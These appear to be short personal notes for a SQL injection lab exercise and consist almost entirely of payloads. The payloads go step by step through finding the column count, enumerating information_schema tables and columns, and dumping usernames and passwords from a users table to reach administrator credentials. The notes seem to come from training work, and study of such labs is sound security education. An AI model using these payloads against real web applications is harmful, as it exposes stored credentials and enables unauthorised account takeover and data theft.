#SQL injection attack, listing the database contents on non-Oracle databases
##determine number of col
category=Pets' ORDER BY 3--

##determine which col contain text data
category=Pets' UNION SELECT 'A','B' --

##retrieve the list of tables in the DB
category=Pets' UNION SELECT table_name,table_type FROM information_schema.tables --

##find the name of the table with credentials (view VS base table)

##list column names from table users_einfgr
category=Pets' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users_einfgr' --

##find the name of the columns for username,password

##list users(username,password) from table users_einfgr
category=Pets' UNION SELECT username_dijibu,password_lbhtwt FROM users_einfgr --

##find the administrator credentials



